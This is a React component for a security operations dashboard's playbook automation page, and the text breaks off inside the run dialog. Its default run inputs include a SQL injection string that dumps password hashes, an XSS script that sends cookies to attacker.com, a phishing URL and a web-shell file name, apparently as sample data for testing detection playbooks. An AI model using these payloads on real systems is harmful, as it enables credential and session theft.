import React, { useRef, useState, useEffect, useCallback } from 'react';
import axios from 'axios';
import {
  AlertOctagon,
  Ban,
  Bell,
  BookOpen,
  Check,
  CheckCircle2,
  ChevronRight,
  Clock,
  Cpu,
  Database,
  FileText,
  GripVertical,
  HardDrive,
  Link2,
  Link2Off,
  Lock,
  Mail,
  Pencil,
  Play,
  Plus,
  RefreshCw,
  Save,
  Search,
  ShieldAlert,
  ShieldOff,
  Siren,
  Terminal,
  Trash2,
  ToggleLeft,
  ToggleRight,
  Usb,
  UserCheck,
  Wrench,
  X,
  Zap,
} from 'lucide-react';
import { useToast } from '../components/Toast';

// ─── Step types ───────────────────────────────────────────────────────────────
const STEP_TYPES = [
  { type: 'PARSE_EMAIL',    label: 'Parse Email & IOCs', Icon: Mail,        color: 'purple'  },
  { type: 'HARDWARE_SCAN',  label: 'USB & Hardware Scan',Icon: Usb,         color: 'amber'   },
  { type: 'THREAT_SCAN',    label: 'Threat Payload Scan',Icon: ShieldAlert, color: 'red'     },
  { type: 'QUARANTINE',     label: 'Quarantine Vault',   Icon: Lock,        color: 'orange'  },
  { type: 'USER_CHALLENGE', label: 'Step-Up MFA Challenge',Icon: UserCheck, color: 'sky'     },
  { type: 'RESTRICT',       label: 'Restrict Access',    Icon: Ban,         color: 'rose'    },
  { type: 'NOTIFY',         label: 'Notify Team',        Icon: Bell,        color: 'sky'     },
  { type: 'CONTAIN',        label: 'Contain Asset',      Icon: ShieldOff,   color: 'orange'  },
  { type: 'INVESTIGATE',    label: 'Investigate Telemetry',Icon: Search,    color: 'purple'  },
  { type: 'ESCALATE',       label: 'Escalate Priority',  Icon: AlertOctagon,color: 'red'     },
  { type: 'REMEDIATE',      label: 'Remediate Config',   Icon: Wrench,      color: 'emerald' },
  { type: 'BLOCK',          label: 'Block IP / Domain',  Icon: Ban,         color: 'red'     },
  { type: 'TICKET',         label: 'Create Incident',    Icon: FileText,    color: 'blue'    },
];

const STEP_TYPE_STYLES = {
  sky:     { text: 'text-sky-300',     border: 'border-sky-500/30',     bg: 'bg-sky-500/10'    },
  orange:  { text: 'text-orange-300',  border: 'border-orange-500/30',  bg: 'bg-orange-500/10' },
  purple:  { text: 'text-purple-300',  border: 'border-purple-500/30',  bg: 'bg-purple-500/10' },
  red:     { text: 'text-red-300',     border: 'border-red-500/30',     bg: 'bg-red-500/10'    },
  emerald: { text: 'text-emerald-300', border: 'border-emerald-500/30', bg: 'bg-emerald-500/10'},
  blue:    { text: 'text-blue-300',    border: 'border-blue-500/30',    bg: 'bg-blue-500/10'   },
  amber:   { text: 'text-amber-300',   border: 'border-amber-500/30',   bg: 'bg-amber-500/10'  },
  rose:    { text: 'text-rose-300',    border: 'border-rose-500/30',    bg: 'bg-rose-500/10'   },
};

const PLAYBOOK_STATUS_STYLES = {
  ACTIVE:   { text: 'text-emerald-300', border: 'border-emerald-500/25', bg: 'bg-emerald-500/10' },
  INACTIVE: { text: 'text-slate-400',   border: 'border-white/10',       bg: 'bg-white/5'        },
};

const SEVERITY_STYLES = {
  CRITICAL: { text: 'text-red-300',    border: 'border-red-500/25',    bg: 'bg-red-500/10'    },
  HIGH:     { text: 'text-orange-300', border: 'border-orange-500/25', bg: 'bg-orange-500/10' },
  MEDIUM:   { text: 'text-amber-300',  border: 'border-amber-500/25',  bg: 'bg-amber-500/10'  },
  LOW:      { text: 'text-sky-300',    border: 'border-sky-500/25',    bg: 'bg-sky-500/10'    },
};

const USB_DEVICES_PRESETS = [
  { id: 'usb-sandisk-cruzer', vendor: 'SanDisk Corp. Cruzer Blade 32GB', vid: '0781', pid: '5567', serial: 'SD-984210', status: 'UNAUTHORIZED_MASS_STORAGE' },
  { id: 'usb-kingston-dt',   vendor: 'Kingston DataTraveler 64GB G4',   vid: '0951', pid: '1666', serial: 'KT-104928', status: 'AUTHORIZED_CORPORATE_DRIVE' },
  { id: 'usb-rubber-ducky',  vendor: 'Rogue USB Rubber Ducky HID Injector', vid: '1337', pid: '0001', serial: 'DUCKY-001', status: 'HIGH_RISK_HID_ATTACK_VECTOR' },
  { id: 'usb-generic-flash', vendor: 'Generic USB Mass Storage 16GB',   vid: '125f', pid: '312b', serial: 'GEN-551920', status: 'UNREGISTERED_PERIPHERAL' },
];

const emptyStep = { id: '', type: 'NOTIFY', title: '', description: '', actionNotes: '' };

// ─── Sub-components ───────────────────────────────────────────────────────────
function StepTypeBadge({ type }) {
  const def = STEP_TYPES.find((s) => s.type === type) ?? STEP_TYPES[0];
  const style = STEP_TYPE_STYLES[def.color] || STEP_TYPE_STYLES.purple;
  const { Icon } = def;
  return (
    <span className={`inline-flex items-center gap-1 rounded-full border px-2 py-0.5 text-[9px] font-bold font-mono tracking-[0.14em] uppercase ${style.text} ${style.border} ${style.bg}`}>
      <Icon className="h-2.5 w-2.5" />
      {def.label}
    </span>
  );
}

function SeverityBadge({ severity }) {
  const style = SEVERITY_STYLES[severity?.toUpperCase()] ?? SEVERITY_STYLES.LOW;
  return (
    <span className={`inline-flex items-center gap-1 rounded-full border px-2 py-0.5 text-[9px] font-bold font-mono tracking-[0.14em] uppercase ${style.text} ${style.border} ${style.bg}`}>
      {severity}
    </span>
  );
}

function StatusBadge({ status }) {
  const isEnabled = status === 'ACTIVE';
  const style = isEnabled ? PLAYBOOK_STATUS_STYLES.ACTIVE : PLAYBOOK_STATUS_STYLES.INACTIVE;
  return (
    <span className={`inline-flex items-center gap-1.5 rounded-full border px-2.5 py-0.5 text-[9px] font-bold font-mono tracking-widest uppercase ${style.text} ${style.border} ${style.bg}`}>
      <span className={`h-1.5 w-1.5 rounded-full ${isEnabled ? 'bg-emerald-400 animate-pulse' : 'bg-slate-500'}`} />
      {isEnabled ? 'ACTIVE' : 'INACTIVE'}
    </span>
  );
}

// ─── Main Page ────────────────────────────────────────────────────────────────
export default function Playbooks() {
  const { showToast } = useToast();
  const dragRef = useRef(null);

  const [playbooks, setPlaybooks] = useState([]);
  const [alertRules, setAlertRules] = useState([]);
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const [selectedPbId, setSelectedPbId] = useState('');
  const [statusFilter, setStatusFilter] = useState('ALL');
  const [searchTerm, setSearchTerm] = useState('');

  const [steps, setSteps] = useState([]);
  const [pbMeta, setPbMeta] = useState({ name: '', description: '', status: 'ACTIVE', linkedAlertRuleId: null });

  const [dragOverIdx, setDragOverIdx] = useState(null);
  const [showStepEditor, setShowStepEditor] = useState(false);
  const [editingStep, setEditingStep] = useState(null);
  const [stepForm, setStepForm] = useState({ ...emptyStep });
  const [showLinkModal, setShowLinkModal] = useState(false);
  const [saving, setSaving] = useState(false);

  // Execution state & Interactive Input Modal state
  const [showRunInputModal, setShowRunInputModal] = useState(false);
  const [runInputForm, setRunInputForm] = useState({
    autoMineLogs: true,
    usbState: 'CONNECTED',
    usbDisconnected: false,
    senderEmail: 'attacker@phishing-security-update.xyz',
    emailBody: `URGENT SECURITY NOTICE: Your corporate account credentials have been suspended. Click http://malicious-phishing-login.xyz/verify to unlock password immediately!`,
    usbDeviceId: 'usb-sandisk-cruzer',
    usbVendor: 'SanDisk Corp. Cruzer Blade 32GB (VID: 0781, PID: 5567)',
    targetUrl: 'https://sentinelcore.internal/v1/auth/login',
    sqlPayload: `' UNION SELECT username, password_hash FROM users--`,
    xssScript: `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`,
    fileName: `cmd_web_shell.php`,
    fileHash: `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`,
    sourceIp: ``,
  });

  const [running, setRunning] = useState(false);
  const [runResult, setRunResult] = useState(null);
  const [runVisibleSteps, setRunVisibleSteps] = useState(0);

  // ── Load playbooks & rules ────────────────────────────────────────────────
  const loadData = useCallback(async () => {
    try {
      setRefreshing(true);
      const [pbRes, rulesRes] = await Promise.all([
        axios.get('/api/playbooks'),
        axios.get('/api/playbooks/alert-rules'),
      ]);

      const normalizedPlaybooks = (pbRes.data || []).map((pb) => ({
        ...pb,
        status: (pb.status === 'DRAFT' || pb.status === 'ARCHIVED' || pb.status === 'INACTIVE') ? 'INACTIVE' : 'ACTIVE',
      }));

      setPlaybooks(normalizedPlaybooks);
      setAlertRules(rulesRes.data || []);

      if (normalizedPlaybooks.length > 0) {
        const current = normalizedPlaybooks.find(p => p.id === selectedPbId) || normalizedPlaybooks[0];
        setSelectedPbId(current.id);
        setSteps([...(current.steps || [])]);
        setPbMeta({
          name: current.name,
          description: current.description,
          status: current.status,
          linkedAlertRuleId: current.linkedAlertRuleId,
        });
      }
    } catch (err) {
      showToast({ type: 'error', message: 'Failed to fetch playbooks from backend' });
    } finally {
      setLoading(false);
      setRefreshing(false);
    }
  }, [selectedPbId, showToast]);

  useEffect(() => {
    loadData();
  }, [loadData]);

  const filteredPlaybooks = playbooks.filter((pb) => {
    const matchesFilter = statusFilter === 'ALL' || pb.status === statusFilter;
    const matchesSearch = pb.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
                          pb.description.toLowerCase().includes(searchTerm.toLowerCase());
    return matchesFilter && matchesSearch;
  });

  const selectedPb = playbooks.find((p) => p.id === selectedPbId);
  const linkedRule = alertRules.find((r) => r.id === pbMeta.linkedAlertRuleId);

  // Determine type of playbook for contextual run inputs
  const getPlaybookCategory = () => {
    if (!selectedPb) return 'GENERIC';
    const name = selectedPb.name.toLowerCase();
    if (name.includes('phish') || name.includes('email')) return 'PHISHING';
    if (name.includes('usb') || name.includes('peripheral') || name.includes('hardware')) return 'USB';
    if (name.includes('sql')) return 'SQLI';
    if (name.includes('xss')) return 'XSS';
    if (name.includes('upload') || name.includes('file')) return 'FILE_UPLOAD';
    if (name.includes('unauthorized') || name.includes('access')) return 'UNAUTH_ACCESS';
    if (name.includes('ransom')) return 'RANSOMWARE';
    if (name.includes('privilege') || name.includes('priv')) return 'PRIVILEGE_ABUSE';
    return 'GENERIC';
  };

  // ── Select playbook ─────────────────────────────────────────────────────────
  const selectPlaybook = (pb) => {
    setSelectedPbId(pb.id);
    setSteps([...(pb.steps || [])]);
    setPbMeta({
      name: pb.name,
      description: pb.description,
      status: pb.status === 'INACTIVE' ? 'INACTIVE' : 'ACTIVE',
      linkedAlertRuleId: pb.linkedAlertRuleId,
    });
  };

  // ── Toggle Enabled / Disabled ──────────────────────────────────────────────
  const handleToggleStatus = async (pb, e) => {
    if (e) e.stopPropagation();
    const newStatus = pb.status === 'ACTIVE' ? 'INACTIVE' : 'ACTIVE';
    try {
      const payload = { ...pb, status: newStatus };
      const res = await axios.put(`/api/playbooks/${pb.id}`, payload);
      const updated = { ...res.data, status: newStatus };
      setPlaybooks((prev) => prev.map((p) => (p.id === pb.id ? updated : p)));
      if (pb.id === selectedPbId) {
        setPbMeta((prev) => ({ ...prev, status: newStatus }));
      }
      showToast({ type: 'success', message: `Playbook "${pb.name}" ${newStatus === 'ACTIVE' ? 'Enabled' : 'Disabled'}.` });
    } catch (err) {
      showToast({ type: 'error', message: 'Failed to toggle playbook status' });
    }
  };

  // ── Save playbook ─────────────────────────────────────────────────────────
  const handleSave = async () => {
    if (!selectedPbId) return;
    setSaving(true);
    try {
      const payload = {
        name: pbMeta.name,
        description: pbMeta.description,
        status: pbMeta.status,
        linkedAlertRuleId: pbMeta.linkedAlertRuleId,
        steps,
      };
      const res = await axios.put(`/api/playbooks/${selectedPbId}`, payload);
      const savedPb = { ...res.data, status: pbMeta.status };
      setPlaybooks((prev) => prev.map((p) => (p.id === selectedPbId ? savedPb : p)));
      showToast({ type: 'success', message: `Playbook "${savedPb.name}" saved to database.` });
    } catch (err) {
      showToast({ type: 'error', message: err.response?.data?.message || 'Failed to save playbook' });
    } finally {
      setSaving(false);
    }
  };

  // ── New playbook ──────────────────────────────────────────────────────────
  const handleNewPlaybook = async () => {
    try {
      const payload = {
        name: 'New Custom Response Playbook',
        description: 'Describe this automated response workflow...',
        status: 'ACTIVE',
        linkedAlertRuleId: null,
        steps: [
          { id: `s-${Date.now()}-1`, type: 'INVESTIGATE', title: 'Gather Telemetry Context', description: 'Collect logs and entity telemetry.', actionNotes: 'API: LogExplorer' },
          { id: `s-${Date.now()}-2`, type: 'NOTIFY', title: 'Dispatch Alert', description: 'Notify on-call security response team.', actionNotes: 'Webhook: #soc-alerts' }
        ],
      };
      const res = await axios.post('/api/playbooks', payload);
      const newPb = { ...res.data, status: 'ACTIVE' };
      setPlaybooks((prev) => [newPb, ...prev]);
      selectPlaybook(newPb);
      showToast({ type: 'success', message: 'New playbook created' });
    } catch (err) {
      showToast({ type: 'error', message: 'Failed to create new playbook' });
    }
  };

  // ── Delete playbook ───────────────────────────────────────────────────────
  const handleDeletePlaybook = async (id, e) => {
    e.stopPropagation();
    if (!window.confirm('Are you sure you want to delete this playbook?')) return;
    try {
      await axios.delete(`/api/playbooks/${id}`);
      const remaining = playbooks.filter((p) => p.id !== id);
      setPlaybooks(remaining);
      if (remaining.length > 0) {
        selectPlaybook(remaining[0]);
      } else {
        setSelectedPbId('');
        setSteps([]);
      }
      showToast({ type: 'success', message: 'Playbook deleted' });
    } catch (err) {
      showToast({ type: 'error', message: 'Failed to delete playbook' });
    }
  };

  // ── Open Interactive Run Modal ────────────────────────────────────────────
  const openRunModal = () => {
    if (!selectedPbId) return;
    setShowRunInputModal(true);
  };

  // ── Execute Live Playbook with user input params ──────────────────────────
  const executePlaybookWithParams = async () => {
    setShowRunInputModal(false);
    setRunning(true);
    setRunResult(null);
    setRunVisibleSteps(0);
    try {
      const res = await axios.post(`/api/playbooks/${selectedPbId}/run`, runInputForm);
      setRunResult(res.data);
      const total = res.data.executedSteps?.length || 0;
      for (let i = 1; i <= total; i++) {
        await new Promise((resolve) => setTimeout(resolve, 300));
        setRunVisibleSteps(i);
      }
      showToast({ type: 'success', message: `Playbook "${res.data.playbookName}" executed live on backend operations!` });
    } catch (err) {
      showToast({ type: 'error', message: 'Failed to execute playbook on backend' });
    } finally {
      setRunning(false);
    }
  };

  // ── Drag & Drop ───────────────────────────────────────────────────────────
  const onDragStart = (idx) => { dragRef.current = idx; };
  const onDragOver = (e, idx) => { e.preventDefault(); setDragOverIdx(idx); };
  const onDrop = (e, idx) => {
    e.preventDefault();
    const from = dragRef.current;
    if (from === null || from === idx) { setDragOverIdx(null); return; }
    const arr = [...steps];
    const [moved] = arr.splice(from, 1);
    arr.splice(idx, 0, moved);
    setSteps(arr);
    dragRef.current = null;
    setDragOverIdx(null);
  };
  const onDragEnd = () => { dragRef.current = null; setDragOverIdx(null); };

  // ── Step editor ───────────────────────────────────────────────────────────
  const openAddStep = () => {
    setEditingStep(null);
    setStepForm({ ...emptyStep, id: `s-${Date.now()}` });
    setShowStepEditor(true);
  };
  const openEditStep = (step) => {
    setEditingStep(step.id);
    setStepForm({ ...step });
    setShowStepEditor(true);
  };
  const handleSaveStep = () => {
    if (!stepForm.title.trim()) {
      showToast({ type: 'error', message: 'Step title is required.' });
      return;
    }
    if (editingStep) {
      setSteps((prev) => prev.map((s) => (s.id === editingStep ? { ...stepForm } : s)));
    } else {
      setSteps((prev) => [...prev, { ...stepForm }]);
    }
    setShowStepEditor(false);
  };
  const handleDeleteStep = (id) => {
    setSteps((prev) => prev.filter((s) => s.id !== id));
  };

  // ── Link alert rule ───────────────────────────────────────────────────────
  const handleLinkRule = (ruleId) => {
    setPbMeta((prev) => ({ ...prev, linkedAlertRuleId: ruleId }));
    setShowLinkModal(false);
    showToast({ type: 'success', message: ruleId ? 'Alert rule linked to playbook.' : 'Alert rule unlinked.' });
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center py-24">
        <div className="h-8 w-8 animate-spin rounded-full border-2 border-primary/20 border-t-primary" />
      </div>
    );
  }

  const category = getPlaybookCategory();

  return (
    <div className="space-y-5 sc-fade-in">

      {/* ── Page header ───────────────────────────────────────────────────── */}
      <div className="sc-panel flex flex-col gap-4 p-6 xl:flex-row xl:items-center xl:justify-between">
        <div>
          <div className="flex flex-wrap items-center gap-2">
            <span className="sc-badge border-purple-500/20 bg-purple-500/10 text-purple-300">
              <BookOpen className="h-2.5 w-2.5" /> Playbook Automation Engine
            </span>
            <span className="sc-badge border-emerald-500/20 bg-emerald-500/10 text-emerald-300">
              <Zap className="h-2.5 w-2.5" /> Automatic Log Mining & Real USB Hardware Scan Active
            </span>
          </div>
          <h1 className="mt-3 text-2xl font-extrabold tracking-tight text-white">Playbook Automation</h1>
          <p className="mt-1 text-sm text-slate-400">
            Build, edit, and run response playbooks. Performs real OS USB hardware bus scans and automatically mines system Audit & Security logs in real-time.
          </p>
        </div>
        <div className="flex items-center gap-2">
          <button
            onClick={loadData}
            disabled={refreshing}
            className="c-p flex items-center gap-2 rounded-xl border border-white/10 bg-white/5 px-3 py-2.5 text-xs font-semibold text-slate-300 hover:border-white/20 hover:text-white transition disabled:opacity-40"
          >
            <RefreshCw className={`h-3.5 w-3.5 ${refreshing ? 'animate-spin text-purple-400' : ''}`} />
            Refresh
          </button>
          <button
            onClick={handleNewPlaybook}
            className="c-p sc-button-primary px-5 py-2.5 text-xs font-semibold"
          >
            <Plus className="h-3.5 w-3.5" /> New Playbook
          </button>
        </div>
      </div>

      {/* ── Two-panel layout ──────────────────────────────────────────────── */}
      <div className="grid grid-cols-1 gap-5 xl:grid-cols-3">

        {/* Left panel — playbook list & filters */}
        <div className="sc-panel flex flex-col overflow-hidden">
          <div className="p-4 border-b border-white/8 space-y-3">
            <div className="flex items-center justify-between">
              <p className="sc-text-kicker">Playbooks ({filteredPlaybooks.length})</p>
              <div className="flex rounded-lg border border-white/10 bg-white/5 p-0.5 text-[10px] font-mono">
                {['ALL', 'ACTIVE', 'INACTIVE'].map((st) => (
                  <button
                    key={st}
                    onClick={() => setStatusFilter(st)}
                    className={`c-p px-2 py-0.5 rounded ${statusFilter === st ? 'bg-sky-500/20 text-sky-300 font-bold' : 'text-slate-400 hover:text-white'}`}
                  >
                    {st === 'ALL' ? 'All' : st === 'ACTIVE' ? 'Active' : 'Disabled'}
                  </button>
                ))}
              </div>
            </div>

            <div className="relative">
              <Search className="absolute left-3 top-2.5 h-3.5 w-3.5 text-slate-500" />
              <input
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                placeholder="Search playbooks..."
                className="glass-input w-full pl-9 pr-3 py-1.5 text-xs"
              />
            </div>
          </div>

          <div className="flex-1 overflow-y-auto divide-y divide-white/5 max-h-[600px]">
            {filteredPlaybooks.length === 0 ? (
              <div className="py-12 text-center text-xs font-mono text-slate-500">
                No matching playbooks found.
              </div>
            ) : (
              filteredPlaybooks.map((pb) => {
                const rule = alertRules.find((r) => r.id === pb.linkedAlertRuleId);
                const isActive = pb.id === selectedPbId;
                const isEnabled = pb.status === 'ACTIVE';

                return (
                  <div
                    key={pb.id}
                    onClick={() => selectPlaybook(pb)}
                    className={`c-p group w-full p-4 text-left transition hover:bg-white/3 ${isActive ? 'bg-blue-500/8 border-l-2 border-sky-400' : ''}`}
                  >
                    <div className="flex items-start justify-between gap-2">
                      <div className="min-w-0 flex-1">
                        <div className="flex items-center gap-2 mb-1">
                          <StatusBadge status={pb.status} />
                          <p className={`text-sm font-semibold truncate ${isActive ? 'text-white' : 'text-slate-200'}`}>
                            {pb.name}
                          </p>
                        </div>
                        <p className="text-[10px] font-mono text-slate-500 truncate">{pb.description}</p>
                      </div>

                      <div className="flex items-center gap-1.5">
                        <button
                          onClick={(e) => handleToggleStatus(pb, e)}
                          className={`p-1 rounded-lg transition ${isEnabled ? 'text-emerald-400 hover:text-emerald-300' : 'text-slate-600 hover:text-slate-400'}`}
                          title={isEnabled ? 'Disable Playbook' : 'Enable Playbook'}
                        >
                          {isEnabled ? <ToggleRight className="h-4 w-4" /> : <ToggleLeft className="h-4 w-4" />}
                        </button>
                        <button
                          onClick={(e) => handleDeletePlaybook(pb.id, e)}
                          className="opacity-0 group-hover:opacity-100 p-1 text-slate-500 hover:text-red-400 transition"
                          title="Delete playbook"
                        >
                          <Trash2 className="h-3 w-3" />
                        </button>
                      </div>
                    </div>

                    <div className="mt-2 flex items-center justify-between text-[10px] font-mono text-slate-500">
                      <span>{(pb.steps || []).length} steps</span>
                      {rule ? (
                        <span className="inline-flex items-center gap-1 text-sky-400 truncate max-w-[150px]">
                          <Link2 className="h-2.5 w-2.5" /> {rule.name}
                        </span>
                      ) : (
                        <span className="text-slate-600">Manual Trigger</span>
                      )}
                    </div>
                  </div>
                );
              })
            )}
          </div>
        </div>

        {/* Right panel — step canvas & playbook detail */}
        <div className="sc-panel flex flex-col xl:col-span-2">

          {selectedPb ? (
            <>
              {/* Playbook header */}
              <div className="border-b border-white/8 p-5">
                <div className="flex flex-wrap items-start justify-between gap-3">
                  <div className="min-w-0 flex-1">
                    <div className="flex flex-wrap items-center gap-3 mb-2">
                      <StatusBadge status={pbMeta.status} />
                      <button
                        onClick={() => setPbMeta((p) => ({ ...p, status: p.status === 'ACTIVE' ? 'INACTIVE' : 'ACTIVE' }))}
                        className={`c-p inline-flex items-center gap-1.5 rounded-lg border px-3 py-1 text-xs font-mono font-bold transition ${
                          pbMeta.status === 'ACTIVE'
                            ? 'border-emerald-500/30 bg-emerald-500/10 text-emerald-300 hover:bg-emerald-500/20'
                            : 'border-white/10 bg-white/5 text-slate-400 hover:text-white'
                        }`}
                      >
                        {pbMeta.status === 'ACTIVE' ? <ToggleRight className="h-4 w-4 text-emerald-400" /> : <ToggleLeft className="h-4 w-4" />}
                        {pbMeta.status === 'ACTIVE' ? 'Status: ENABLED' : 'Status: DISABLED'}
                      </button>
                    </div>

                    <input
                      value={pbMeta.name}
                      onChange={(e) => setPbMeta((p) => ({ ...p, name: e.target.value }))}
                      className="w-full bg-transparent text-lg font-extrabold text-white focus:outline-none focus:border-b focus:border-sky-400/40 pb-0.5"
                      placeholder="Playbook name..."
                    />
                    <input
                      value={pbMeta.description}
                      onChange={(e) => setPbMeta((p) => ({ ...p, description: e.target.value }))}
                      className="mt-1 w-full bg-transparent text-xs text-slate-400 focus:outline-none"
                      placeholder="Brief description of this response workflow..."
                    />
                  </div>
                </div>

                {/* Linked alert rule chip */}
                <div className="mt-3 flex flex-wrap items-center gap-2">
                  {linkedRule ? (
                    <span className="inline-flex items-center gap-1.5 rounded-xl border border-sky-500/25 bg-sky-500/10 px-3 py-1.5 text-xs font-mono text-sky-300">
                      <Link2 className="h-3 w-3" />
                      Linked Rule: {linkedRule.name}
                      <SeverityBadge severity={linkedRule.severity} />
                    </span>
                  ) : (
                    <span className="text-xs font-mono text-slate-600">No alert rule linked (Manual Execution Only)</span>
                  )}
                  <button
                    onClick={() => setShowLinkModal(true)}
                    className="c-p sc-button-secondary px-3 py-1.5 text-[10px] font-semibold"
                  >
                    <Link2 className="h-3 w-3" />
                    {linkedRule ? 'Change Linked Rule' : 'Link Alert Rule'}
                  </button>
                </div>
              </div>

              {/* Step canvas */}
              <div className="flex-1 overflow-y-auto p-5 min-h-[300px]">
                {steps.length === 0 ? (
                  <div className="flex flex-col items-center justify-center py-16 text-center">
                    <Zap className="mb-3 h-10 w-10 text-slate-700" />
                    <p className="text-sm font-mono text-slate-400">No response steps defined.</p>
                    <p className="text-xs font-mono text-slate-600 mt-1">Add your first step to configure the automated workflow.</p>
                  </div>
                ) : (
                  <div className="relative flex flex-col gap-0">
                    {steps.map((step, idx) => {
                      const def = STEP_TYPES.find((s) => s.type === step.type) ?? STEP_TYPES[0];
                      const style = STEP_TYPE_STYLES[def.color] || STEP_TYPE_STYLES.purple;
                      const { Icon } = def;
                      const isDragOver = dragOverIdx === idx;
                      return (
                        <div key={step.id || idx}>
                          {isDragOver && dragRef.current !== idx && (
                            <div className="h-1 rounded-full bg-sky-400/60 mx-4 mb-2 shadow-[0_0_8px_rgba(56,189,248,0.5)]" />
                          )}
                          {idx > 0 && (
                            <div className="flex justify-center">
                              <div className="w-px h-4 bg-white/10" />
                            </div>
                          )}
                          <div
                            draggable
                            onDragStart={() => onDragStart(idx)}
                            onDragOver={(e) => onDragOver(e, idx)}
                            onDrop={(e) => onDrop(e, idx)}
                            onDragEnd={onDragEnd}
                            className={`group flex items-start gap-3 rounded-2xl border p-4 transition-all ${
                              dragRef.current === idx ? 'opacity-40 scale-95' : ''
                            } border-white/8 bg-white/3 hover:bg-white/5 hover:border-white/12`}
                          >
                            <div className="mt-1 cursor-grab text-slate-700 hover:text-slate-400 transition active:cursor-grabbing">
                              <GripVertical className="h-4 w-4" />
                            </div>

                            <div className={`flex h-7 w-7 shrink-0 items-center justify-center rounded-xl border text-[10px] font-extrabold font-mono ${style.text} ${style.border} ${style.bg}`}>
                              {idx + 1}
                            </div>

                            <div className={`mt-0.5 rounded-xl border p-1.5 ${style.border} ${style.bg}`}>
                              <Icon className={`h-4 w-4 ${style.text}`} />
                            </div>

                            <div className="min-w-0 flex-1">
                              <div className="flex flex-wrap items-center gap-2 mb-1">
                                <StepTypeBadge type={step.type} />
                              </div>
                              <p className="text-sm font-semibold text-white">{step.title}</p>
                              {step.description && (
                                <p className="mt-0.5 text-xs text-slate-500 leading-relaxed">{step.description}</p>
                              )}
                              {step.actionNotes && (
                                <p className="mt-1 font-mono text-[10px] text-sky-400/80 bg-sky-500/5 px-2 py-0.5 rounded border border-sky-500/10 inline-block">
                                  {step.actionNotes}
                                </p>
                              )}
                            </div>

                            <div className="flex items-center gap-1 opacity-0 group-hover:opacity-100 transition">
                              <button
                                onClick={() => openEditStep(step)}
                                className="c-p rounded-lg border border-white/8 bg-white/5 p-1.5 text-slate-400 hover:text-white transition"
                                title="Edit step"
                              >
                                <Pencil className="h-3 w-3" />
                              </button>
                              <button
                                onClick={() => handleDeleteStep(step.id)}
                                className="c-p rounded-lg border border-red-500/15 bg-red-500/5 p-1.5 text-red-400 hover:text-red-300 transition"
                                title="Delete step"
                              >
                                <Trash2 className="h-3 w-3" />
                              </button>
                            </div>
                          </div>
                        </div>
                      );
                    })}

                    {dragOverIdx === steps.length && (
                      <div
                        onDragOver={(e) => onDragOver(e, steps.length)}
                        onDrop={(e) => onDrop(e, steps.length)}
                        className="h-1 rounded-full bg-sky-400/60 mx-4 mt-2 shadow-[0_0_8px_rgba(56,189,248,0.5)]"
                      />
                    )}
                  </div>
                )}

                <div className="mt-4 flex justify-center">
                  <button
                    onClick={openAddStep}
                    className="c-p flex items-center gap-2 rounded-2xl border border-dashed border-white/15 bg-white/3 px-6 py-3 text-xs font-mono text-slate-400 hover:border-sky-400/30 hover:text-sky-300 transition"
                  >
                    <Plus className="h-3.5 w-3.5" /> Add Step
                  </button>
                </div>
              </div>

              {/* Action bar */}
              <div className="flex items-center justify-between gap-3 border-t border-white/8 p-4">
                <span className="text-[10px] font-mono text-slate-500">{steps.length} steps · Status: <strong className="text-white">{pbMeta.status}</strong></span>
                <div className="flex items-center gap-2">
                  <button
                    onClick={openRunModal}
                    disabled={running || steps.length === 0}
                    className="c-p flex items-center gap-2 rounded-xl border border-emerald-500/30 bg-emerald-500/10 px-5 py-2.5 text-xs font-extrabold text-emerald-300 hover:bg-emerald-500/20 hover:border-emerald-500/50 transition disabled:opacity-40 shadow-[0_0_12px_rgba(16,185,129,0.15)]"
                  >
                    {running ? (
                      <div className="h-3.5 w-3.5 animate-spin rounded-full border-2 border-emerald-300/30 border-t-emerald-300" />
                    ) : (
                      <Play className="h-3.5 w-3.5 text-emerald-300 fill-emerald-300" />
                    )}
                    {running ? 'Executing Live...' : 'Run Playbook'}
                  </button>
                  <button
                    onClick={handleSave}
                    disabled={saving}
                    className="c-p sc-button-primary px-4 py-2.5 text-xs font-semibold disabled:opacity-40"
                  >
                    {saving ? (
                      <div className="h-3.5 w-3.5 animate-spin rounded-full border-2 border-white/30 border-t-white" />
                    ) : (
                      <Save className="h-3.5 w-3.5" />
                    )}
                    Save Changes
                  </button>
                </div>
              </div>
            </>
          ) : (
            <div className="flex flex-col items-center justify-center py-24">
              <BookOpen className="mb-3 h-10 w-10 text-slate-700" />
              <p className="text-sm font-mono text-slate-400">Select a playbook from the left panel.</p>
            </div>
          )}
        </div>
      </div>

      {/* ── Interactive Playbook Run Parameters & Auto-Mining Dialog ──────────────── */}
      {showRunInputModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 p-4 backdrop-blur-md">
          <div className="sc-modal relative w-full max-w-xl p-6 sc-scale-in space-y-4">
            <button onClick={() => setShowRunInputModal(false)} className="c-p absolute right-4 top-4 text-slate-400 hover:text-white transition">
              <X className="h-5 w-5" />
            </button>

            <div className="flex items-center gap-2.5 border-b border-white/8 pb-3">
              <div className="flex h-9 w-9 items-center justify-center rounded-xl border border-emerald-500/30 bg-emerald-500/10 text-emerald-400">
                <Play className="h-4 w-4 fill-emerald-400" />
              </div>
              <div>
                <h3 className="text-base font-extrabold text-white">Execute Playbook Live</h3>
                <p className="text-xs font-mono text-slate-400">{selectedPb?.name}</p>
              </div>
            </div>

            {/* USB-Specific Connection Switcher */}
            {category === 'USB' ? (
              <div className="space-y-3">
                <p className="text-[10px] font-bold uppercase tracking-widest text-amber-400">USB Physical Hardware State</p>
                <div className="grid grid-cols-2 gap-2">
                  <button
                    type="button"
                    onClick={() => setRunInputForm((f) => ({ ...f, usbState: 'CONNECTED', usbDisconnected: false }))}
                    className={`c-p p-3 rounded-xl border text-xs font-mono font-bold flex flex-col items-center justify-center gap-1.5 transition ${
                      runInputForm.usbState !== 'DISCONNECTED'
                        ? 'border-amber-500/40 bg-amber-500/15 text-amber-300 shadow-[0_0_12px_rgba(245,158,11,0.2)]'
                        : 'border-white/10 bg-white/5 text-slate-400 hover:text-white'
                    }`}
                  >
                    <Usb className="h-5 w-5 text-amber-400" />
                    <span>🔌 USB Drive Plugged In</span>
